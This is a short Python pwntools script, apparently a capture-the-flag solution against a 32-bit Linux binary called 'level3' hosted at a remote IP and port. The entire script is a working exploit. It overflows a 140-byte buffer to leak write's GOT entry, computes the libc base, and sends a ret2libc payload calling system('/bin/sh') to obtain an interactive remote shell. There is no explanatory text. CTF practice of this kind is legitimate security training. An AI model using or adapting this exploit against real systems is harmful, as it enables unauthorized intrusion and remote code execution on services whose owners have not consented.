from pwn import *

context(log_level="debug", arch="i386", os="linux")

sh = remote("111.200.241.244", 64106)
elf = ELF("./level3")
libc = ELF("./libc_32.so.6")

libc_write = libc.symbols["write"]
libc_system = libc.symbols["system"]
libc_bin_sh = next(libc.search(b"/bin/sh\x00"))

write_plt = elf.plt["write"]
write_got = elf.got["write"]
main_addr = elf.symbols["main"]

payload1 = b"a" * 140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
sh.sendlineafter("Input:\n", payload1)

write_addr = u32(sh.recv()[:4])
libc_base = write_addr - libc_write
payload2 = b"a" * 140 + p32(libc_base + libc_system) + p32(0) + p32(libc_base + libc_bin_sh)
sh.sendlineafter("Input:\n", payload2)

sh.interactive()
